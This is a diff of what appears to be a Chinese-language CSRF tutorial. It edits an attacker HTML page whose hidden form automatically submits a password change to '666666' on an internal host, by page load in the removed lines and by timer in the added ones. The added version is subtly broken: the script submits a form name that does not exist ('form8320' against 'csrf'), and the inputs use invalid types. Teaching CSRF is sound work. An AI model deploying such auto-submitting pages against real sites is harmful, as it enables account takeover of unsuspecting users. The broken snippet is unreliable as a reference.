@@ -58,11 +58,11 @@ http://www.aa.com/opt.php?id=135&act=del&name=Tom的链接
     <title>aa</title>
 </head>
 <body>
-    <form action="http://172.23.10.200/index.php/User/Index/RegisterUpdate/id/286" method="post">
-        昵称：<input type="text" name="password" id="password" class="form-control" value="xxxxx">
-        用户名：<input type="text" name="password" id="password" class="form-control" value="xiaoming">
-        密码：<input type="password" name="password" id="password" class="form-control" value="">
-        确认密码：<input type="password" name="cpassword" id="conpassword" class="form-control" value="">
+    <form action="http://172.23.10.200/setpasswd.php" method="post">
+        昵称：<input type="text" name="nickname" id="nickname" value="xxxxx">
+        用户名：<input type="text" name="name" id="name" value="xiaoming">
+        密码：<input type="passwd" name="passwd" id="passwd" value="">
+        确认密码：<input type="rpasswd" name="rpasswd" id="rpasswd" value="">
         <input type="submit" name="button" value="提交">
     </form>
 </body>
@@ -74,11 +74,14 @@ http://www.aa.com/opt.php?id=135&act=del&name=Tom的链接
 <head>
     <title>aa</title>
 </head>
-<body onLoad="document.forms[0].submit()">
-    <form action="http://172.23.10.200/index.php/User/Index/RegisterUpdate/id/286" method="post">
-        <input type="hidden" name="password" id="password" value="666666">
-        <input type="hidden" name="cpassword" id="conpassword" value="666666">
+<body>
+    <form name="csrf" action="http://172.23.10.200/setpasswd.php" method="post">
+        <input type="hidden" name="passwd" id="passwd" value="666666">
+        <input type="hidden" name="rpasswd" id="rpasswd" value="666666">
     </form>
+    <script>
+        setTimeout("document.form8320.submit()",100);
+    </script>
 </body>
 </html>
 ```
